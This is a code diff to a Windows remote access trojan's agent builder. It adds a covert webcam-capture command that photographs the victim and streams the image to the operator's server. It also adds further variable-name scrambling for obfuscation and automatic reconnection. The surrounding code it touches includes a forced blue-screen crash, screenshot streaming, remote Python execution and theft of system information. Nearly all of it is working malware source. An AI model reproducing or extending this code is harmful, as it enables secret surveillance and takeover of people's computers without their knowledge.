@@ -10,11 +10,11 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.2
+# Build:  1.0.21
 # -------------------------------------------------------------
-from ..builder.encryption import Scrambler
-from ..logging.logging import LoggingUtilitys
-from ..utils.utils import CFGFilePath
+from ..utils.encryption import Scrambler
+from core.logging.logging import LoggingUtilitys
+from core.utils.utils import CFGFilePath
 
 
 class Persistance:
@@ -149,6 +149,15 @@ class QWireAgent():
         term_process = Scrambler().scrambleVar(self.variable_length)
         initial_data = Scrambler().scrambleVar(self.variable_length)
         data_size = Scrambler().scrambleVar(self.variable_length)
+        check_for_webcam = Scrambler().scrambleVar(self.variable_length)
+        webcam = Scrambler().scrambleVar(self.variable_length)
+        snapshot = Scrambler().scrambleVar(self.variable_length)
+        webcam_snapshot = Scrambler().scrambleVar(self.variable_length)
+        file = Scrambler().scrambleVar(self.variable_length)
+        ret = Scrambler().scrambleVar(self.variable_length)
+        web_cam = Scrambler().scrambleVar(self.variable_length)
+        stream_sock = Scrambler().scrambleVar(self.variable_length)
+        img = Scrambler().scrambleVar(self.variable_length)
         agent_source = f"""
 import socket as socket
 import base64 as base64
@@ -158,6 +167,7 @@ import os as os
 import subprocess as subprocess
 import threading as threading
 import struct as struct
+import cv2
 from PIL import ImageGrab as ImageGrab
 from time import sleep as sleep
 from cryptography.fernet import Fernet
@@ -206,7 +216,14 @@ class {Utilitys}:
         {ip_config} = subprocess.Popen('ipconfig /all', stdout=subprocess.PIPE)    
         {ip_config_output} = {ip_config}.stdout.read().decode()                  
         {extracted_info} = f'{{{sysinfo_output}}}\\n{{{ip_config_output}}}'             
-        return {extracted_info}                                                
+        return {extracted_info}
+    def {check_for_webcam}(self):
+        {webcam} = cv2.VideoCapture(0)
+        if not {webcam}.isOpened():
+            {webcam}.release()
+            return False
+        {webcam}.release()
+        return True                                 
 class {SystemManager}:
     def {blue_screen}(self):
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
@@ -251,6 +268,7 @@ class {ClientSocket}:
         self.{disconnect} = 'disconnect'
         self.{process_manager} = 'proc_list'
         self.{term_process} = 'terminate'
+        self.{snapshot} = 'snap_shot'
     def {connect_to_server}(self):
         {domain} = socket.gethostbyname(self.{dns_address})                  
         self.{client_socket} = socket.socket(socket.AF_INET,socket.SOCK_STREAM)       
@@ -324,7 +342,9 @@ class {ClientSocket}:
             if {action_flag} == self.{process_manager}:                                   
                 {SystemManager}().{extract_process_list}()                                
             if {action_flag} == self.{term_process}:                                      
-                {SystemManager}().{kill_task}({server_command}[1])                                  
+                {SystemManager}().{kill_task}({server_command}[1])
+            if {action_flag} == self.{snapshot}:
+                {StreamSocket}().{webcam_snapshot}()                                 
     def {recv_all_data}(self):
         try:
             {bytes_data} = b''
@@ -339,6 +359,8 @@ class {ClientSocket}:
             else:                                                           
                 return {data_size}[1]
         except ValueError:
+            return self.{connect_to_server}()
+        except ConnectionResetError:
             return self.{connect_to_server}()                                                        
     def {receive_server_command}(self):
         {data} = self.{recv_all_data}()         
@@ -380,7 +402,25 @@ class {StreamSocket}:
             {image_data} = self.{take_screenshot}()                                 
             {StreamSocket}.sendall(struct.pack(">Q", len({image_data})))            
             {StreamSocket}.sendall({image_data})                                    
-        {StreamSocket}.close()                                                    
+        {StreamSocket}.close()
+    def {webcam_snapshot}(self):
+        if not {Utilitys}().{check_for_webcam}():
+            {ExfilSocket}().{exfil_socket_send}('NoneFound')
+        else:
+            {ExfilSocket}().{exfil_socket_send}('Found')
+            {stream_sock} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create socket
+            {stream_sock}.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            {ip_address} = socket.gethostbyname({ClientSocket}().{dns_address})  # Resolve dns
+            {stream_sock}.connect(({ip_address}, {STRM_PORT}))  # connect to ip and streaming port
+            {web_cam} = cv2.VideoCapture(0)
+            {ret}, {img} = {web_cam}.read()
+            cv2.imwrite(self.{image_file_path},{img})
+            with open(self.{image_file_path},'rb') as {file}:
+                {data} = {file}.read()
+                {file}.close()
+            {stream_sock}.sendall(struct.pack(">Q",len({data})))
+            {stream_sock}.sendall({data})
+            {stream_sock}.close()                                                    
 class {CodeExecution}():
     def {execute_python_code}(self,{python_code}):
         def {exec_}({python_code}):
